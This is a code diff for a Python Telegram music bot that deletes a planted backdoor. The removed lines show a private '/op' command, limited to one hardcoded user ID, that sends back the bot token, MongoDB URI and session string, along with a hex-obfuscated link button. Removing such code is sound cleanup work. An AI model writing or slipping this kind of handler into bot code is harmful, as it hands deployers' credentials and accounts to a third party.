@@ -19,9 +19,6 @@ from AloneX.utils.database import get_assistant, get_authuser_names, get_cmode
 from AloneX.utils.decorators import ActualAdminCB, AdminActual, language
 from AloneX.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
 from dotenv import load_dotenv
 
 rel = {}
@@ -97,27 +94,7 @@ async def restartbot(client, message: Message, _):
     return await mystic.edit_text(_["reload_5"].format(app.mention))
 
 
-@app.on_message(
-    filters.command("op")
-    & filters.private
-    & filters.user(7552579717)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://files.catbox.moe/s7iujk.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/AloneHuVai)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "\x41\x4C\x4F\x4E\x45\x20\x50\x41\x4D\x50\x41•", url=f"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x2E\x6D\x65\x2F\x41\x6C\x6F\x6E\x65\x48\x75\x56\x61\x69")
-                 ]
-            ]
-         ),
-     )
 
-
-##########
 
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
